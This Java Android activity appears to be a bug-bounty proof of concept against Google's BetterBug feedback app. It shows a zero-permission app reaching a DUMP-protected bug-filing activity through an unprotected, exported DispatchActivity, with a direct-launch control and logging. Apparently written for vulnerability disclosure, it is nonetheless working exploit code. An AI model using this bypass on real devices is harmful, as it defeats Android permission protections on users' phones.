package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

/**
 * Zero-permission PoC for com.google.android.apps.betterbug (Google-internal beta feedback
 * app, holds android.permission.DUMP).
 *
 * BugIntentDialogActivity (the real "file a bug" entry point) requires android.permission.DUMP
 * and correctly rejects a direct launch from a zero-perm caller. But the sibling
 * DispatchActivity is exported with NO permission, and its onCreate() forwards the caller's
 * own Intent extras + action into a fresh explicit Intent targeting BugIntentDialogActivity via
 * startActivity() -- since that startActivity() call is made from BetterBug's own process
 * (which legitimately holds DUMP), the OS attributes the launch to BetterBug itself, not the
 * original zero-perm caller, bypassing the permission check entirely.
 */
public class BetterBugDispatchBypassActivity extends Activity {
    private static final String TAG = "VRP-BetterBugBypass";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Control: direct launch of the DUMP-protected activity (expected to fail).
        try {
            Intent direct = new Intent();
            direct.setComponent(new ComponentName("com.google.android.apps.betterbug",
                    "com.google.android.apps.betterbug.filebug.BugIntentDialogActivity"));
            direct.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(direct);
            Log.i(TAG, "Direct launch of BugIntentDialogActivity succeeded (UNEXPECTED)");
        } catch (SecurityException e) {
            Log.e(TAG, "Direct launch correctly BLOCKED: " + e.getMessage());
        }

        // Bypass: go through the unprotected DispatchActivity instead.
        try {
            Intent viaDispatch = new Intent();
            viaDispatch.setComponent(new ComponentName("com.google.android.apps.betterbug",
                    "com.google.android.apps.betterbug.dispatch.DispatchActivity"));
            viaDispatch.putExtra("EXTRA_FOR_DEEPLINK_INTERMEDIATE_SCREEN", true);
            viaDispatch.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(viaDispatch);
            Log.i(TAG, "startActivity() on DispatchActivity returned normally (no SecurityException)");
        } catch (SecurityException e) {
            Log.e(TAG, "DispatchActivity launch BLOCKED: " + e.getMessage());
        }

        finish();
    }
}
